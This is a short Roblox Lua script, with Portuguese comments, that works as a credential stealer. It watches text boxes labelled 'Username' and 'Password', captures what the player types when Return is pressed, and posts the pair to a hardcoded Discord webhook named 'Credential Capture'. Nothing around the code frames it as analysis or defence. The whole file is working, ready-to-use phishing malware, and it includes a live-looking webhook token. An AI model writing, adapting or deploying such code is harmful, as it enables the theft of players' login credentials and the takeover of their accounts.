local webhookUrl = "https://discord.com/api/webhooks/1432144129579548692/5v0TouZ1sJZGi258AwNIQcVan8oNTfios6tuQqT82LEpMUWs1fpJe8lWo-OfXwo75CDA"

local function sendWebhookMessage(message)
    local httpService = game:GetService("HttpService")
    local data = {
        content = message,
        username = "Credential Capture",
        avatar_url = "https://example.com/avatar.png"
    }
    httpService:PostAsync(webhookUrl, httpService:JSONEncode(data))
end

local function captureCredentials()
    local userInputService = game:GetService("UserInputService")
    local username = ""
    local password = ""

    userInputService.InputBegan:Connect(function(input, gameProcessedEvent)
        if input.KeyCode == Enum.KeyCode.Return then
            -- Capturar o nome de usuário e a senha digitados pelo usuário
            local textBox = userInputService:GetFocusedTextBox()
            if textBox.PlaceholderText == "Username" then
                username = textBox.Text
            elseif textBox.PlaceholderText == "Password" then
                password = textBox.Text
            end

            -- Enviar as credenciais capturadas para a webhook do Discord
            sendWebhookMessage(string.format("Username: %s\nPassword: %s", username, password))
        end
    end)
end

captureCredentials()
